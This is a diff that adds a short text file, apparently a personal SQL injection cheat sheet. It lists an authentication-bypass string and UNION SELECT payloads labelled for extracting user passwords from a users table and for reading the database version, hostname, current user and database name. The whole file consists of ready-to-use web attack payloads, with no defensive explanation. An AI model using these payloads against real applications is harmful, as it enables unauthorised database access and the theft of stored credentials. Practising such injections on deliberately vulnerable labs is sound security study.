@@ -1,0 +1,18 @@
+1
+2
+'OR''='
+
+---extract password---
+' UNION SELECT user, password FROM users--
+
+  ---version of database---
+  ' union select null,@@version #
+
+  --Hostname---
+  ' union select null,@@hostname #
+
+  ---current database---
+  ' union all select system_user(), user() #
+
+---database name---
+' union select null, database() #
